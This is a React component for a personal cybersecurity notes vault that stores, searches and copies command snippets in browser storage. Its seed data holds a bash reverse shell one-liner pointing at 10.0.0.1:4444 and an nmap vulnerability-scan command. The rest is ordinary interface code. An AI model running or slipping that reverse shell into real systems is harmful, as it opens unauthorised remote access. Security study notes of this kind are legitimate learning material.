import React, { useState, useEffect } from 'react';
import {
  BookOpen,
  Plus,
  Trash2,
  Copy,
  Check,
  Search,
  Tag,
  Save,
  Terminal,
  Layers,
} from 'lucide-react';
import { Translations } from '../../data/translations';
import { PageId } from '../layout/Sidebar';
import { soundEffects } from '../../utils/audio';

interface KnowledgeBaseViewProps {
  t: Translations;
  onNavigate: (page: PageId, targetId?: string) => void;
}

interface UserNote {
  id: string;
  title: string;
  category: string;
  commandSnippet?: string;
  content: string;
  date: string;
}

export const KnowledgeBaseView: React.FC<KnowledgeBaseViewProps> = () => {
  const [notes, setNotes] = useState<UserNote[]>(() => {
    try {
      const stored = localStorage.getItem('rh_knowledge_notes');
      if (stored) return JSON.parse(stored);
    } catch (_) {}
    return [
      {
        id: 'n1',
        title: 'Reverse Shell One-Liners Cheat Sheet',
        category: 'Exploitation',
        commandSnippet: 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1',
        content: 'Standard Bash interactive reverse shell payload for Linux targets.',
        date: new Date().toLocaleDateString(),
      },
      {
        id: 'n2',
        title: 'Nmap Vulnerability Scan Command',
        category: 'Reconnaissance',
        commandSnippet: 'nmap -sV --script=vuln 192.168.1.1',
        content: 'Runs default vulnerability scripts against detected service versions.',
        date: new Date().toLocaleDateString(),
      },
    ];
  });

  const [search, setSearch] = useState('');
  const [selectedCat, setSelectedCat] = useState('all');
  const [titleInput, setTitleInput] = useState('');
  const [catInput, setCatInput] = useState('Reconnaissance');
  const [cmdInput, setCmdInput] = useState('');
  const [contentInput, setContentInput] = useState('');
  const [copiedId, setCopiedId] = useState<string | null>(null);

  useEffect(() => {
    try {
      localStorage.setItem('rh_knowledge_notes', JSON.stringify(notes));
    } catch (_) {}
  }, [notes]);

  const handleAddNote = (e: React.FormEvent) => {
    e.preventDefault();
    if (!titleInput.trim()) return;
    soundEffects.playSuccess();

    const newNote: UserNote = {
      id: `n-${Date.now()}`,
      title: titleInput.trim(),
      category: catInput.trim() || 'General',
      commandSnippet: cmdInput.trim() || undefined,
      content: contentInput.trim(),
      date: new Date().toLocaleDateString(),
    };

    setNotes([newNote, ...notes]);
    setTitleInput('');
    setCmdInput('');
    setContentInput('');
  };

  const handleDeleteNote = (id: string) => {
    soundEffects.playKeyClick();
    setNotes(notes.filter((n) => n.id !== id));
  };

  const handleCopyCmd = (cmd: string, id: string) => {
    soundEffects.playKeyClick();
    navigator.clipboard.writeText(cmd);
    setCopiedId(id);
    setTimeout(() => setCopiedId(null), 2000);
  };

  const filteredNotes = notes.filter((n) => {
    const matchCat = selectedCat === 'all' || n.category === selectedCat;
    const matchQ = !search || n.title.toLowerCase().includes(search.toLowerCase()) || n.content.toLowerCase().includes(search.toLowerCase());
    return matchCat && matchQ;
  });

  return (
    <div className="space-y-6 max-w-7xl mx-auto pb-12 font-sans">
      {/* Header Banner */}
      <div className="relative overflow-hidden rounded-2xl bg-gradient-to-r from-[#080d14] via-[#0e1726] to-[#070b10] border border-[#172535] p-6 lg:p-8 cyber-glow">
        <div className="flex flex-col md:flex-row items-start md:items-center justify-between gap-6 relative z-10">
          <div className="space-y-2 max-w-2xl">
            <div className="inline-flex items-center gap-2 px-2.5 py-1 rounded-md bg-cyan-500/15 border border-cyan-500/30 text-cyan-400 font-mono text-xs font-bold">
              <BookOpen className="w-4 h-4" />
              <span>PERSONAL KNOWLEDGE VAULT</span>
            </div>
            <h1 className="text-2xl sm:text-3xl font-bold font-mono text-slate-100">
              Cyber Knowledge Base & Notes
            </h1>
            <p className="text-xs sm:text-sm text-slate-400 leading-relaxed font-mono">
              Save custom commands, lab findings, cheat sheets, and technical notes directly into your browser's persistent storage.
            </p>
          </div>

          <div className="p-4 rounded-xl bg-[#080e15] border border-cyan-500/30 font-mono text-xs text-cyan-400 font-bold">
            {notes.length} Saved Cyber Notes
          </div>
        </div>
      </div>

      {/* Main Grid: Create Note Form + Notes List */}
      <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
        {/* Create Note Form */}
        <div className="lg:col-span-5 rounded-2xl bg-[#080d12] border border-[#162230] p-5 space-y-4 font-mono text-xs">
          <div className="flex items-center gap-2 border-b border-[#141d27] pb-3 text-slate-100 font-bold text-sm">
            <Plus className="w-4 h-4 text-cyan-400" />
            <span>Create New Technical Note</span>
          </div>

          <form onSubmit={handleAddNote} className="space-y-3">
            <div className="space-y-1">
              <label className="text-slate-400 text-[11px] font-bold uppercase">Note Title</label>
              <input
                type="text"
                value={titleInput}
                onChange={(e) => setTitleInput(e.target.value)}
                placeholder="e.g. Apache Hardening Rule"
                className="w-full bg-[#05080c] border border-[#16222e] rounded-xl px-3 py-2 text-xs text-slate-200 focus:outline-hidden"
                required
              />
            </div>

            <div className="space-y-1">
              <label className="text-slate-400 text-[11px] font-bold uppercase">Category</label>
              <select
                value={catInput}
                onChange={(e) => setCatInput(e.target.value)}
                className="w-full bg-[#05080c] border border-[#16222e] rounded-xl px-3 py-2 text-xs text-slate-200 focus:outline-hidden cursor-pointer"
              >
                <option value="Reconnaissance">Reconnaissance</option>
                <option value="Web Exploitation">Web Exploitation</option>
                <option value="Password Cracking">Password Cracking</option>
                <option value="Privilege Escalation">Privilege Escalation</option>
                <option value="Blue Team & Defense">Blue Team & Defense</option>
              </select>
            </div>

            <div className="space-y-1">
              <label className="text-slate-400 text-[11px] font-bold uppercase">Command Snippet (Optional)</label>
              <input
                type="text"
                value={cmdInput}
                onChange={(e) => setCmdInput(e.target.value)}
                placeholder="e.g. nmap -sC -sV target"
                className="w-full bg-[#05080c] border border-[#16222e] rounded-xl px-3 py-2 text-xs text-emerald-300 focus:outline-hidden"
              />
            </div>

            <div className="space-y-1">
              <label className="text-slate-400 text-[11px] font-bold uppercase">Note Description</label>
              <textarea
                value={contentInput}
                onChange={(e) => setContentInput(e.target.value)}
                rows={4}
                placeholder="Write detailed notes, flag values, or remediation steps..."
                className="w-full bg-[#05080c] border border-[#16222e] rounded-xl p-3 text-xs text-slate-200 focus:outline-hidden font-sans"
              />
            </div>

            <button
              type="submit"
              className="w-full py-2.5 rounded-xl bg-gradient-to-r from-cyan-500 to-blue-600 hover:from-cyan-400 hover:to-blue-500 text-slate-950 font-bold text-xs shadow-md shadow-cyan-950 transition-all flex items-center justify-center gap-2"
            >
              <Save className="w-4 h-4" />
              <span>Save to Knowledge Base</span>
            </button>
          </form>
        </div>

        {/* Notes List Column */}
        <div className="lg:col-span-7 rounded-2xl bg-[#080d12] border border-[#162230] p-5 space-y-4 font-mono text-xs">
          <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 border-b border-[#141d27] pb-3">
            <div className="relative flex-1">
              <Search className="w-4 h-4 text-slate-400 absolute start-3 top-1/2 -translate-y-1/2" />
              <input
                type="text"
                value={search}
                onChange={(e) => setSearch(e.target.value)}
                placeholder="Search notes & commands..."
                className="w-full bg-[#05080c] border border-[#16222e] rounded-xl ps-9 pe-4 py-2 text-xs text-slate-200 focus:outline-hidden"
              />
            </div>
          </div>

          <div className="space-y-3">
            {filteredNotes.map((note) => (
              <div
                key={note.id}
                className="p-4 rounded-xl bg-[#05080c] border border-[#16222e] space-y-2.5 hover:border-cyan-500/30 transition-all"
              >
                <div className="flex items-center justify-between">
                  <div className="flex items-center gap-2">
                    <span className="text-[10px] font-bold px-2 py-0.5 rounded bg-slate-800 text-cyan-400">
                      {note.category}
                    </span>
                    <h4 className="font-bold text-slate-100 text-sm">{note.title}</h4>
                  </div>
                  <button
                    onClick={() => handleDeleteNote(note.id)}
                    className="text-slate-500 hover:text-red-400"
                    title="Delete note"
                  >
                    <Trash2 className="w-4 h-4" />
                  </button>
                </div>

                {note.commandSnippet && (
                  <div className="p-2.5 rounded-lg bg-[#080d12] border border-[#16222e] text-emerald-300 font-mono text-xs flex items-center justify-between gap-2">
                    <span>$ {note.commandSnippet}</span>
                    <button
                      onClick={() => handleCopyCmd(note.commandSnippet!, note.id)}
                      className="text-slate-400 hover:text-emerald-400"
                    >
                      {copiedId === note.id ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
                    </button>
                  </div>
                )}

                {note.content && (
                  <p className="text-slate-300 font-sans text-xs leading-relaxed">
                    {note.content}
                  </p>
                )}

                <div className="text-[10px] text-slate-500 text-right">
                  Saved on {note.date}
                </div>
              </div>
            ))}
          </div>
        </div>
      </div>
    </div>
  );
};
